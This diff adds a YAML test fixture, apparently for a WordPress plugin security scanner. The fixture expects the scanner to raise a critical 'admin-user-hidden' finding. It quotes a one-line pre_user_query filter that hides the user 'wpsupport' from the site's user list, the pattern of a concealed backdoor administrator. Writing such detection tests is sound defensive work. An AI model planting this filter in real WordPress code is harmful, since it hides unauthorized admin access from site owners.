@@ -1,0 +1,8 @@
+eco: wp-plugin
+note: pre_user_query filter that removes a login from the list (tuner mu-hidden-admin shape)
+features_old: []
+features_new:
+- {kind: user-hide, key: pre_user_query, path: inc/compat.php, line: 20, snippet: 'add_action( ''pre_user_query'',
+    function( $q ) { $q->query_where .= " AND user_login != ''wpsupport''"; } );'}
+expect:
+- {id: admin-user-hidden, min_severity: critical}
